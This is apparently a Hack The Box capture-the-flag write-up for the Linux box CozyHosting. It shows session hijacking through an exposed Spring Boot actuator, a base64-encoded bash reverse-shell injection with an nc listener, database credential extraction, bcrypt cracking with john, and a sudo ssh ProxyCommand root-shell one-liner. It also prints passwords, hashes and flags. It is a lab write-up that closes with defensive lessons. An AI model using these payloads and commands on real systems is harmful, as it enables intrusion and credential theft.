---
description: >-
  Difficulty: Easy OS: Linux (Ubuntu 22.04.3) Attack Path: Nmap →
  cozyhosting.htb Spring Boot → dirsearch → /actuator/sessions → steal kanderson
  session → SSH command injection → shell as app → JAR reve
---

# CozyHosting

## Overview

CozyHosting is an Easy Linux box running a Spring Boot Java web application. Spring Boot exposes actuator endpoints by default and the /actuator/sessions endpoint leaks active session tokens. We steal a session token belonging to kanderson, access the admin dashboard, then exploit a command injection bug in the SSH connection form to get a reverse shell as app. Inside the app directory is a JAR file. We download and decompile it to find hardcoded PostgreSQL credentials. Connect to the database, pull out bcrypt hashes, crack josh's hash with john, SSH in as josh, then use a GTFOBins sudo ssh ProxyCommand one-liner to become root.

## Enumeration

### Nmap

```
nmap -T4 -A -v 10.10.11.230
```

![Zenmap scan - ports 22 SSH, 80 nginx, 8000 http-alt, 8383 m2mservices](<../../.gitbook/assets/Unknown image (369)>)

Open ports:

| Port | Service | Version              |
| ---- | ------- | -------------------- |
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu |
| 80   | HTTP    | nginx 1.18.0         |
| 8000 | HTTP    | http-alt             |
| 8383 | TCP     | m2mservices          |

Add cozyhosting.htb to /etc/hosts.

### Directory Brute Force

```
dirsearch -u cozyhosting.htb
```

![dirsearch output - /actuator, /actuator/health, /actuator/env, /actuator/sessions, /actuator/mappings all returning 200](<../../.gitbook/assets/Unknown image (370)>)

Spring Boot actuator endpoints are exposed. The most interesting one is **/actuator/sessions** which leaks active user sessions.

## Session Hijack via /actuator/sessions

Browse to http://cozyhosting.htb/actuator/sessions:

![/actuator/sessions JSON response - session 7D69B73F... mapped to "kanderson"](<../../.gitbook/assets/Unknown image (371)>)

The endpoint returns a JSON map of session IDs to usernames. We can see kanderson has an active session. Copy that session token and set it as our JSESSIONID cookie.

### Using the Session

Open the login page at /login, open browser dev tools → Storage → Cookies. Replace the JSESSIONID value with kanderson's token:

![Browser dev tools - JSESSIONID cookie set to stolen token, login page visible](<../../.gitbook/assets/Unknown image (372)>)

Refresh the page and we are now authenticated as kanderson and can see the admin dashboard with an SSH connection feature.

***

## Command Injection in SSH Connection Form

The admin dashboard has a form that takes a hostname and username to connect via SSH. The username field is passed directly into a system call. We can inject extra commands by using a newline-terminated payload.

Since spaces are filtered we use IFS substitution: use \ to represent spaces in the payload.

Set up a listener:

```
nc -nvlp 9092
```

Payload in the username field (URL-encoded newline + bash reverse shell):

```
;echo"BASE64_ENCODED_REVERSE_SHELL"|base64-d|bash;
```

Submit and catch the shell:

![nc listener - shell received as app@cozyhosting, ls shows cloudhosting-0.0.1.jar](<../../.gitbook/assets/Unknown image (373)>)

Shell landed as **app** inside /app. There is a file cloudhosting-0.0.1.jar.

## JAR Analysis - Extracting Database Credentials

Set up a Python HTTP server on the target to download the JAR:

```
python3 -m http.server 1235
```

On Kali:

```
wget http://10.10.11.230:1235/cloudhosting-0.0.1.jar
```

![wget downloading cloudhosting-0.0.1.jar - 57M JAR file being saved](<../../.gitbook/assets/Unknown image (374)>)

Open the JAR in a Java decompiler (JD-GUI or jadx). Navigate to BOOT-INF/classes and open application.properties:

![JD-GUI showing application.properties - spring.datasource.password=Vg\&nvzAQ7XxR, datasource URL cozyhosting on postgres](<../../.gitbook/assets/Unknown image (375)>)

Found:

```
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

## Extracting Hashes from PostgreSQL

Connect to the PostgreSQL database using the credentials found:

```
psql -h 127.0.0.1 -U postgres
Password for user postgres: Vg&nvzAQ7XxR
```

![psql prompt - connecting, viewing tables, selecting name, password, role from users](<../../.gitbook/assets/Unknown image (376)>)

Switch database and query the users:

```
\c cozyhosting
select * from users;
```

| name      | password                                                     | role  |
| --------- | ------------------------------------------------------------ | ----- |
| kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User  |
| admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yr8uqqbNNpIPjUb2MZib3H9kV08dm | Admin |

Copy these hashes to crack them.

## Cracking josh's Credentials

Create a file hash.txt containing the admin's hash and run John the Ripper:

```
john hash.txt --wordlist=rockyou.txt
```

![john running on hash.txt - loading bcrypt hash](<../../.gitbook/assets/Unknown image (377)>)

John decrypts the bcrypt hash:

![john cracked password - manchesterunited cracked for the admin hash](<../../.gitbook/assets/Unknown image (378)>)

```
admin : manchesterunited
```

The user josh is present on the host. Try logging in as josh using this cracked password:

```
ssh josh@10.10.11.230
Password: manchesterunited
```

![SSH session as josh - logged in, welcome message](<../../.gitbook/assets/Unknown image (379)>)

We log in successfully. Let's grab the user flag:

```
cat user.txt
```

![user.txt flag output - e2a60d08...](<../../.gitbook/assets/Unknown image (380)>)

```
e2a60d08d139f52fd6944c41ef4d9f88
```

## Privilege Escalation to Root

Check sudo privileges:

```
sudo -l
```

![sudo -l output showing (root) /usr/bin/ssh \* is allowed without password](<../../.gitbook/assets/Unknown image (381)>)

The user josh can run /usr/bin/ssh \* as root. According to GTFOBins, we can execute arbitrary commands or spawn a root shell by configuring a malicious ProxyCommand option in SSH.

Run the escalation one-liner:

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

We instantly drop into a root shell:

![Root shell - running cat /root/root.txt returning the root flag](<../../.gitbook/assets/Unknown image (381)>)

```
cat /root/root.txt
9f905fc9150a8108502244ff113646a1
```

We have successfully pwned CozyHosting!

## Summary

| Step             | Detail                                                        |
| ---------------- | ------------------------------------------------------------- |
| Nmap             | Port 22 (SSH), 80 (nginx), 8000, 8383                         |
| Actuator Leak    | /actuator/sessions leaks kanderson JSESSIONID                 |
| Session Hijack   | Modify cookie to log in as administrator                      |
| SSH RCE          | Command injection via hostname field (;echo...                |
| JAR Inspection   | Download cloudhosting-0.0.1.jar, parse pplication.properties |
| DB Access        | Postgres DB: cozyhosting -> dmin bcrypt hash                 |
| Cracking         | john cracks admin password: manchesterunited                  |
| SSH              | SSH to host as josh using same password                       |
| Sudo SSH Exploit | sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x -> root            |

## Key Takeaways

* Spring Boot Actuator endpoints must be protected; exposing /actuator/sessions allows trivial authentication bypass.
* Never use user inputs directly in system-level calls (like building SSH command strings) without strict sanitization.
* Embedded system configuration properties in JARs should not store production database passwords.
* Password reuse is highly common; the password for the web application admin also worked for the host's SSH user.
* GTFOBins commands like ssh with wildcard arguments (\*) can be easily manipulated via command options (-o) to execute shells.

_Platform: Hack The Box_
